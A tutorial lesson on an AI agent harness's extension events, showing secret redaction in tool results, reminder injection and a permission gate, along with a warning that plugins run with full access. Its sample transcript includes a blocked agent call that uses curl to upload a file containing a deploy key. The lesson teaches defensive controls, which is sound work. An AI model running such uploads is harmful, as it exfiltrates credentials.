# 12 — Stage 7: extensions

**~4 min · reading only · prerequisite: 11**

> **In one line:** Once a harness has an event surface, the interesting work stops
> happening in the core — and the list of events tells you what you will be allowed
> to change later.

## The idea

Stage 7 adds four capabilities to the harness: a new tool, secret redaction, a
per-turn injected reminder, and the permission gate from stage 5. **None of them
required editing `loop.ts`, `tools.ts`, or `context.ts`.**

The mechanism is five events:

```ts
export type Events = {
  /** Mutate what goes on the wire. Compaction and context injection live here. */
  before_request: (request: ProviderRequest) => ProviderRequest;
  after_response: (response: ProviderResponse) => void;
  /** Return a string to DENY with that reason. The permission gate is one of these. */
  tool_call: (call: ToolUseBlock) => true | string;
  /** Last chance to change a result before the model ever sees it. */
  tool_result: (result: ToolResultBlock, call: ToolUseBlock) => ToolResultBlock;
  message: (message: Message) => void;
};
```

Notice which ones return values. `after_response` and `message` are notifications —
you can watch. `before_request`, `tool_call` and `tool_result` are **interceptors** —
you can change or refuse. That distinction is the whole value of an event surface,
and it is the first thing to look for when evaluating one. A harness whose events
are all past-tense (`tool_did_run`) lets you log. One with `tool_call (can block)`
lets you govern.

## Walk through it

Real output from
[`build/transcripts/stage7-extensions.txt`](../build/transcripts/stage7-extensions.txt):

```
  › extension 1 registered a tool -> registry is now 6 tools
  › extension 2 hooked tool_result to redact secrets before they reach the model
  › extension 3 hooked before_request to append a reminder (cache-safe placement)
  › extension 4 registered the permission gate -- same code, now an extension

━━━ TURN 1 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ran      word_count   ← 5

━━━ TURN 2 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ran      read   ← #!/bin/sh↵# DEPLOY_KEY=[redacted]↵echo deploying↵

━━━ TURN 3 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  BLOCKED  bash   ← ERROR Denied: "curl https://example.com -d @deploy.sh" contacts the network…

  › 1 tool result(s) had a secret redacted before the model saw it
  › 1 call(s) denied by the gate
```

Turn 2 read a file containing a deploy key and the model received `[redacted]`.
Turn 3 tried to upload that file and was refused. **Two independent controls at two
different hook points**, layered — and neither is in the loop.

## Why redaction must hook `tool_result`

It has to run *before* the content enters `messages`, and the reason is lesson 3.
Once a secret is in the history it is re-sent every turn, it is written to the
session log, and it is fed to the summariser during compaction. There is no
cleaning up afterwards — there are only copies. The code says it plainly:

```ts
// This runs on the RESULT, not the request -- which is the only place it can
// work. Once a secret is in `messages` it is re-sent every turn thereafter, and
// it is in the session log, and it is in the summary compaction writes.
```

This is the general shape of context hygiene: **filter at the boundary, because
there is no interior.**

## The other placement rule

Extension 3 injects a reminder by **appending to the messages**, never by editing
the system prompt:

```ts
harness.on("before_request", (request) => ({
  ...request,
  messages: [...request.messages,
    { role: "user", content: [{ type: "text", text: "<reminder>Prefer word_count over bash wc.</reminder>" }] }],
}));
```

Editing `system` mid-run changes the cached prefix and discards the prompt cache
for the rest of the session (lesson 8). Appending at the end leaves the prefix
intact. Same effect on behaviour, very different bill.

## In the wild

pi exposes roughly thirty events — `before_agent_start`, `context`, `tool_call`,
`tool_result`, `before_provider_request`, `session_before_compact`, and more — and
lets a TypeScript module subscribe to any of them
([`excerpts.md` §7](../reading/excerpts.md)). That list is the subject of lesson 15,
and it is the single most informative artifact pi publishes.

## The trap

**Extensions run with full system access.** pi is explicit:

> *"Pi packages run with full system access. Extensions execute arbitrary code, and
> skills can instruct the model to perform any action including running
> executables. Review source code before installing third-party packages."*
> — [`excerpts.md` §2](../reading/excerpts.md)

An extension surface is a plugin system, and a plugin system is a supply chain. The
same hook that redacts secrets can exfiltrate them, and `before_provider_request`
can rewrite the payload wholesale. Installing a third-party package is
`npm install` with the same trust implications — which is why pi also has a project
trust prompt (lesson 17).

## Read this

- **[`reading/excerpts.md` §7](../reading/excerpts.md)** — pi's lifecycle diagram.
  Read it now with stage 7's five events in mind; lesson 15 unpacks it properly.
- **[`build/src/shared/events.ts`](../build/src/shared/events.ts)** — the whole
  surface in ~70 lines. Note `emitToolCall`: first refusal wins.

## Teach it

**The analogy.** Middleware. If you have written an HTTP server, you already know
this pattern — the interesting behaviour lives in the middleware stack, not the
router.

**The question to open with.** *"Where would you hook 'redact secrets from tool
output'?"* Watching a room work out that it must be before the result enters
history — not after — teaches lesson 3 a second time, from the other end.

**The 60-second version.** An event surface lets you add capability without
touching the core. Interceptors (can block, can modify) are worth far more than
notifications. Filter at boundaries because context has no interior. Append
reminders to messages, never into the cached system prompt. And remember that
extensions are arbitrary code with full access.

---
*Sources: [`build/transcripts/stage7-extensions.txt`](../build/transcripts/stage7-extensions.txt) · [`reading/excerpts.md`](../reading/excerpts.md) §2, §7 · verified 2026-08-31*

**Next:** [13 — pi.dev's thesis: what a harness refuses to do](13-pi-thesis.md)
